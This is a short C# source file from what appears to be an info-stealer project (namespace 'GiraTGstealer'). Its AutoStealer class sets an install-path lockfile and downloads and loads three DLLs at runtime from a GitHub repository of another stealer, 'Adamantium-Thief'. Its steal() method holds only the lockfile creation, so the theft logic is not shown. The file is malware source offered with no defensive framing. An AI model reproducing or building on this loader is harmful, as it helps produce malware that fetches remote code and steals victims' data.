using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer
{
    internal class AutoStealer
    {
        private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";

        public static void loadDlls()
        {
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
        }

        private static void steal()
        {
            File.Create(lockfile);
        }
    }
}
